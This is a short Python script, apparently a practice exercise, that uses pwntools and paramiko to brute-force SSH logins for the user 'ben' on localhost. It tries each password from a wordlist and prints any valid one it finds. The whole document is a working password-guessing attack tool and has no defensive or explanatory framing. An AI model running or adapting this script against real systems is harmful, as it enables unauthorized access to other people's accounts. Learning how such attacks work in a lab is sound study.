from pwn import * #will be used to interact with SSH service
import paramiko #pwn module uses paramiko module for error handling

host = "127.0.0.1"
username = "ben"
attempts = 0

with open("wordlist.txt", "r") as password_list:
    for password in password_list:
        password = password.strip("\n")
        try:
            print("[{}] Attempting password: '{}'!".format(attempts, password))
            response = ssh(host=host, user=username, password=password, timeout = 1) # uses pwn module to make ssh connection using password
            if response.connected():
                print("[>] Valid password found: '{}!".format(password))
                response.close()
                break
            response.close()
        except paramiko.ssh_exception.AuthenticationException:
            print("[X] Invalid password!")
        attempts +=1
